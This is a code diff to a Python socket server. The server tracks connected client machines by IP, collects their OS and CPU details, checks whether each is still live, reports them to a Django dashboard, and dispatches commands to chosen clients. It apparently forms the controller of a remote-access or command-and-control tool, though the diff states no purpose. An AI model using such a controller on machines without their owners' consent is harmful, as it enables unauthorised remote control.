@@ -11,6 +11,7 @@ class Con_Stor():
         self.client_socket_object = client_socket_object
         self.addr = addr
         self.machine_info = str(client_socket_object.recv(1024).decode('ascii'))
+        self.status =  "Active"
 
     def read_file(self, path):
         try:
@@ -46,10 +47,29 @@ class Con_Stor():
             except:
                 continue
             
+ACTIVE_CONNECTIONS = {}
 
-ACTIVE_CONNECTIONS = []
+def process_machine_info(data):
+    data = data.split("|")
+    info = data[-5:]
+    keys = ["Node Name","OS","Version","CPU"]
+    ret_data = {}
+    for i in range(len(keys)):
+        ret_data[keys[i]] = info[i]
+    
+    return ret_data
 
-RESPONSE_DIRECTORY = {}
+def manage_connection_status():
+    for ip in ACTIVE_CONNECTIONS.keys():
+        obj =  ACTIVE_CONNECTIONS[ip]
+        if obj.status == "Active":
+            sock_obj = obj.client_socket_object
+            try:
+                sock_obj.send("test".encode("ascii"))
+            except ConnectionError:
+                obj.status = "Inactive"
+
+
 
 class Server:
     def __init__(self, ip, port, django_server):
@@ -57,43 +77,48 @@ class Server:
         self.socket_obj.bind((ip, port))
         self.django_server = django_server
 
-        
     def manage_listen_and_add(self):
         self.socket_obj.listen(5)
-        
-        try:
-            while True:
-                client_conn_object, addr = self.socket_obj.accept()
+        while True:
+            client_conn_object, addr = self.socket_obj.accept()
+            print(addr)
+            # Add to ACTIVE_CONNECTIONS dict -> indexed by IP {IP1:<object 'ConStor'>, IP2:<object 'ConStor'>}
+            if addr[0] not in ACTIVE_CONNECTIONS.keys():
                 con_stor = Con_Stor(client_socket_object=client_conn_object,
-                                    addr=addr)
-                ACTIVE_CONNECTIONS.append(con_stor)
+                                addr=addr)
+                ACTIVE_CONNECTIONS[addr[0]] = con_stor
+            else:
+                ACTIVE_CONNECTIONS[addr[0]].status = "Active"
+                ACTIVE_CONNECTIONS[addr[0]].client_socket_object = client_conn_object
+
+    def manage_update_connection_db(self):
+        while True:
+            # Update connection status
+            manage_connection_status()
+
+            # Send connection data to the Django server
+            data = {}
+            for ip in ACTIVE_CONNECTIONS.keys():
+                machine_inf = process_machine_info(ACTIVE_CONNECTIONS[ip].machine_info)
+                machine_inf["Status"] = ACTIVE_CONNECTIONS[ip].status
+                data[ip] = machine_inf
+            url = f"{self.django_server}/update_conn"
+            print(data)
+            try:
+                r = requests.post(url=url,json=data)
+                print(r.status_code," STATUS CHECK")
+            except:
+                pass
             
-        except KeyboardInterrupt:
-            pass
+            time.sleep(10)
 
-    def manage_POST_connection_objects(self):
-        try:
-            while True:
-                data = {}
-                for connection in ACTIVE_CONNECTIONS:
-                    data[connection.addr[0]] = connection.machine_info
-                
-                try:
-                    r = requests.post(url=self.django_server,
-                                    data=data)
-                except:
-                    pass
-
-                time.sleep(10)    
-        except KeyboardInterrupt:
-            pass
-
-def execute_command(id, command):
-    obj = ACTIVE_CONNECTIONS[id-1]
+def execute_command(ip, command):
+    obj = ACTIVE_CONNECTIONS[ip]
     command = command.split()
 
     if command[0] == "exit":
-        ACTIVE_CONNECTIONS.pop(id-1)
+        obj.json_send("exit")
+        del ACTIVE_CONNECTIONS[ip]
         #RESPONSE_DIRECTORY[id] = "Closed Connection"
         return "Closed Connection"
 
@@ -121,12 +146,12 @@ def run_manager(ip, port, django_server):
                  django_server=django_server)
     
     listen_thread = threading.Thread(target=obj.manage_listen_and_add, daemon=True)
-    command_thead = threading.Thread(target=obj.manage_POST_connection_objects, daemon=True)
+    update_thread = threading.Thread(target=obj.manage_update_connection_db, daemon=True)
 
     listen_thread.start()
-    command_thead.start()
+    update_thread.start()
 
     listen_thread.join()
-    command_thead.join()
+    update_thread.join()
 
     obj.socket_obj.close()
